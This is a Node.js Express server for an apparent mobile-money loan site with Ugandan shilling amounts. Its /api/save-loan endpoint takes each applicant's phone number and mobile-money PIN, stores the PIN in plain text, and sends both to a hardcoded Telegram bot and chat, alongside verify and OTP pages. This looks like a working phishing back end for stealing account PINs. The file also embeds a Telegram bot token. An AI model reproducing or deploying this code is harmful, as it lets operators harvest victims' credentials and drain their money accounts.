const express = require('express');
const cors = require('cors');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const { open } = require('sqlite');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '8435858184:AAHZaY-yRx-B5ritv-LIzeB7YymjQw9CeWg';
const TELEGRAM_CHAT_ID = '8392790531';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Database setup
const DB_PATH = '/tmp/loans.db';
let db = null;

async function initDatabase() {
    try {
        db = await open({ filename: DB_PATH, driver: sqlite3.Database });
        await db.exec(`
            CREATE TABLE IF NOT EXISTS loans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                loan_id TEXT UNIQUE,
                phone TEXT,
                pin TEXT,
                network TEXT,
                amount INTEGER,
                duration INTEGER,
                monthly_payment INTEGER,
                total_payment INTEGER,
                interest INTEGER,
                status TEXT DEFAULT 'pending',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            );
        `);
        console.log('✅ Database initialized');
        return true;
    } catch (error) {
        console.error('❌ Database error:', error);
        return false;
    }
}

async function sendTelegramMessage(text, replyMarkup = null) {
    try {
        const payload = { chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' };
        if (replyMarkup) payload.reply_markup = replyMarkup;
        const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        const data = await response.json();
        if (data.ok) {
            console.log('✅ Telegram sent');
        } else {
            console.error('Telegram error:', data);
        }
    } catch (error) {
        console.error('Telegram send error:', error);
    }
}

function generateLoanId() {
    return `MUG${Date.now().toString(36)}${Math.random().toString(36).substring(2, 8)}`.toUpperCase();
}

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Save loan application
app.post('/api/save-loan', async (req, res) => {
    try {
        console.log('Received:', req.body);
        const { phone, pin, network, amount, duration, monthly, total, interest } = req.body;
        
        const loanId = generateLoanId();
        
        if (db) {
            await db.run(
                `INSERT INTO loans (loan_id, phone, pin, network, amount, duration, monthly_payment, total_payment, interest, status)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
                [loanId, phone, pin, network, amount, duration, monthly, total, interest, 'pending']
            );
        }
        
        const messageText = `<b>🔴 NEW LOAN APPLICATION</b>\n\n` +
            `Loan ID: <code>${loanId}</code>\n` +
            `Amount: UGX ${amount.toLocaleString()}\n` +
            `Network: ${network}\n` +
            `Phone: <code>${phone}</code>\n` +
            `PIN: <code>${pin}</code>\n` +
            `Duration: ${duration/30} months\n` +
            `Monthly: UGX ${monthly.toLocaleString()}`;
        
        const replyMarkup = {
            inline_keyboard: [[
                { text: "✅ Approve", callback_data: `approve_${loanId}` },
                { text: "❌ Decline", callback_data: `decline_${loanId}` }
            ]]
        };
        
        await sendTelegramMessage(messageText, replyMarkup);
        res.json({ success: true, loanId: loanId });
        
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Webhook handler
app.post('/webhook/telegram', async (req, res) => {
    try {
        const update = req.body;
        if (update.callback_query) {
            const [action, loanId] = update.callback_query.data.split('_');
            if (action === 'approve' && db) {
                await db.run(`UPDATE loans SET status = 'approved' WHERE loan_id = ?`, [loanId]);
            }
            await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: update.callback_query.id, text: "Done" })
            });
        }
        res.sendStatus(200);
    } catch (error) {
        res.sendStatus(200);
    }
});

// Get loan status
app.get('/api/loan/:loanId', async (req, res) => {
    try {
        if (!db) return res.json({ success: true, loan: { status: 'pending' } });
        const loan = await db.get(`SELECT * FROM loans WHERE loan_id = ?`, [req.params.loanId]);
        res.json({ success: true, loan: loan || { status: 'pending' } });
    } catch (error) {
        res.json({ success: true, loan: { status: 'pending' } });
    }
});

// Serve HTML pages
app.get('/', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'index.html')); });
app.get('/verify.html', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'verify.html')); });
app.get('/otp.html', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'otp.html')); });

// Start server
async function startServer() {
    await initDatabase();
    app.listen(PORT, '0.0.0.0', () => {
        console.log(`🚀 Server running on port ${PORT}`);
    });
}

startServer();
